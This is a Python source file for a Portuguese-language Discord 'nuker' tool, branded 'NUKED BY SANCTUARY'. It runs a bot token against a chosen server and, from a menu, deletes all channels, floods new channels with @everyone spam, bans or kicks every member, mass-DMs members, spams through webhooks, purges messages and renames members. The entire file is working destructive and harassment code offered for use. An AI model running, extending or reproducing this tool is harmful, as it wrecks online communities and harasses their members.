import discord
import asyncio
import json
import os
import sys
import time
from discord.ext import commands
from utils.interface import clear_screen, print_gradient_ascii, wait_enter, RED, WHITE, RESET

CONFIG_FILE = "config/settings.json"
FIXED_CHANNEL_NAME = "NUKED BY SANCTUARY"

def load_config():
    if not os.path.exists(CONFIG_FILE):
        return {"token": "", "message": ""}
    try:
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return {"token": "", "message": ""}

def save_config(config):
    if not os.path.exists("config"): os.makedirs("config")
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(config, f, indent=4, ensure_ascii=False)

# --- MOTOR DE EXECUÇÃO ---

async def execute_remote_cmd(guild, option, config, bot):
    msg = config["message"]
    stop_event = asyncio.Event()

    async def watch_stop():
        while not stop_event.is_set():
            line = await asyncio.to_thread(sys.stdin.readline)
            if line.strip().lower() == 's':
                stop_event.set()
                print(f"{RED}[!] Comando de parada recebido!{RESET}")

    stop_task = asyncio.create_task(watch_stop())
    print(f"\n{RED}[!] Executando no servidor: {guild.name}")
    print(f"[!] Digite 's' e ENTER para interromper a qualquer momento.{RESET}\n")

    try:
        if option == "1": # Nuke
            await asyncio.gather(*[c.delete() for c in guild.channels], return_exceptions=True)
            for _ in range(100):
                if stop_event.is_set(): break
                ch = await guild.create_text_channel(name=FIXED_CHANNEL_NAME)
                async def spam(c):
                    for _ in range(200):
                        if stop_event.is_set(): break
                        try: await c.send(f"@everyone {msg}")
                        except: break
                asyncio.create_task(spam(ch))
                await asyncio.sleep(0.1)

        elif option == "2": # Delete Channels
            await asyncio.gather(*[c.delete() for c in guild.channels], return_exceptions=True)

        elif option == "3": # Create Channels
            for _ in range(50):
                if stop_event.is_set(): break
                await guild.create_text_channel(name=FIXED_CHANNEL_NAME)

        elif option == "4": # Ban All
            for m in guild.members:
                if stop_event.is_set(): break
                if m.id != bot.user.id: asyncio.create_task(m.ban(reason=msg))

        elif option == "5": # Kick All
            for m in guild.members:
                if stop_event.is_set(): break
                if m.id != bot.user.id: asyncio.create_task(m.kick(reason=msg))

        elif option == "6": # Spam Everyone
            while not stop_event.is_set():
                for c in guild.text_channels:
                    asyncio.create_task(c.send(f"@everyone {msg}"))
                await asyncio.sleep(0.5)

        elif option == "7": # Spam Message
            while not stop_event.is_set():
                for c in guild.text_channels:
                    asyncio.create_task(c.send(msg))
                await asyncio.sleep(0.4)

        elif option == "8": # Rename Server
            await guild.edit(name=msg[:32])

        elif option == "9": # Webhook Spam
            for c in guild.text_channels:
                if stop_event.is_set(): break
                web = await c.create_webhook(name=FIXED_CHANNEL_NAME)
                asyncio.create_task(web.send(msg))

        elif option == "10": # Create Roles
            for _ in range(50):
                if stop_event.is_set(): break
                await guild.create_role(name=FIXED_CHANNEL_NAME, color=discord.Color.red())

        elif option == "11": # Nickname All
            for m in guild.members:
                if stop_event.is_set(): break
                asyncio.create_task(m.edit(nick=FIXED_CHANNEL_NAME[:32]))

        elif option == "12": # DM All
            for m in guild.members:
                if stop_event.is_set() or m.bot: continue
                try: 
                    await m.send(msg)
                    await asyncio.sleep(0.5)
                except: pass

        elif option == "13": # Purge
            for c in guild.text_channels:
                if stop_event.is_set(): break
                try: await c.purge(limit=100)
                except: pass

    except Exception as e:
        print(f"{RED}[ERRO] {e}{RESET}")
    finally:
        stop_task.cancel()
    print(f"\n{RED}[+] Operação concluída.{RESET}")
    await asyncio.sleep(2)

# --- MENUS ---

async def server_selection(config):
    bot = commands.Bot(command_prefix="!!", intents=discord.Intents.all())

    @bot.event
    async def on_ready():
        while True:
            clear_screen(); print_gradient_ascii()
            guilds = list(bot.guilds)
            print(f"{WHITE}Servidores Disponíveis:{RESET}")
            for i, g in enumerate(guilds):
                print(f"{RED}[{i}]{WHITE} {g.name} ({g.id})")
            
            print(f"\n{WHITE}Escolha o índice ou 'B' para voltar:")
            u_in = await asyncio.to_thread(lambda: sys.stdin.readline().strip())
            if u_in.lower() == 'b': await bot.close(); break
            
            target = None
            if u_in.isdigit() and int(u_in) < len(guilds): target = guilds[int(u_in)]
            
            if target:
                while True:
                    clear_screen(); print_gradient_ascii()
                    print(f"{RED}--- ALVO: {target.name} ---{RESET}\n")
                    print(f"{RED}[1] !nuke     {WHITE}")
                    print(f"{RED}[2] !die      {WHITE}")
                    print(f"{RED}[3] !chn      {WHITE}")
                    print(f"{RED}[4] !banall   {WHITE}")
                    print(f"{RED}[5] !kick     {WHITE}")
                    print(f"{RED}[6] !everyone {WHITE}")
                    print(f"{RED}[7] !spam     {WHITE}")
                    print(f"{RED}[8] !rename   {WHITE}")
                    print(f"{RED}[9] !webhook  {WHITE}")
                    print(f"{RED}[10] !roleall {WHITE}")
                    print(f"{RED}[11] !nick    {WHITE}")
                    print(f"{RED}[12] !dmall   {WHITE}")
                    print(f"{RED}[13] !purge   {WHITE}")
                    print(f"\n{RED}[B] Voltar para seleção de servidor{RESET}")
                    
                    cmd = await asyncio.to_thread(lambda: sys.stdin.readline().strip().lower())
                    if cmd == 'b': break
                    await execute_remote_cmd(target, cmd, config, bot)

    try:
        await bot.start(config["token"])
    except:
        print(f"\n{RED}[ERRO] Token inválido ou erro de conexão!{RESET}")
        time.sleep(2)

def main_menu():
    while True:
        cfg = load_config()
        clear_screen(); print_gradient_ascii()
        
        # --- AVISOS DE CONFIGURAÇÃO ---
        status_token = f"{RED}NÃO CONFIGURADO" if not cfg.get("token") else f"{WHITE}CONFIGURADO"
        status_msg = f"{RED}NÃO CONFIGURADO" if not cfg.get("message") else f"{WHITE}CONFIGURADO"
        
        print(f"{WHITE}STATUS DO TOKEN: {status_token}")
        print(f"{WHITE}STATUS DA MSG:   {status_msg}\n")
        
        print(f"{RED}[1] {WHITE}funções")
        print(f"{RED}[2] {WHITE}Editar Token")
        print(f"{RED}[3] {WHITE}Editar Mensagem")
        print(f"{RED}[4] {WHITE}Informações")
        print(f"{RED}[5] {WHITE}Sair")
        
        opt = input(f"\n{RED}Opção: {RESET}")
        
        if opt == "1":
            if not cfg.get("token") or not cfg.get("message"):
                print(f"\n{RED}[!] ERRO: Você precisa configurar o TOKEN e a MENSAGEM antes!{RESET}")
                wait_enter()
            else:
                try: asyncio.run(server_selection(cfg))
                except: pass
            
        elif opt == "2":
            clear_screen(); print_gradient_ascii()
            print(f"{WHITE}Digite o novo Token ou aperte ENTER para cancelar.{RESET}")
            new_t = input("Token: ").strip()
            if new_t:
                cfg["token"] = new_t
                save_config(cfg)
                print(f"\n{RED}[+] Token salvo!{RESET}"); time.sleep(1)
            else: print(f"\n{RED}[!] Operação cancelada.{RESET}"); time.sleep(1)
            
        elif opt == "3":
            clear_screen(); print_gradient_ascii()
            print(f"{WHITE}Digite a nova Mensagem ou aperte ENTER para cancelar.{RESET}")
            new_m = input("Mensagem: ").strip()
            if new_m:
                cfg["message"] = new_m
                save_config(cfg)
                print(f"\n{RED}[+] Mensagem salva!{RESET}"); time.sleep(1)
            else: print(f"\n{RED}[!] Operação cancelada.{RESET}"); time.sleep(1)
            
        elif opt == "4":
            clear_screen(); print_gradient_ascii()
            print(f"{RED}--- INFORMAÇÕES ---\n\nCriador: xysix\nCanal Fixo: {FIXED_CHANNEL_NAME}\nVersão: 1.0{RESET}")
            wait_enter()
            
        elif opt == "5":
            sys.exit()

if __name__ == "__main__":
    main_menu()
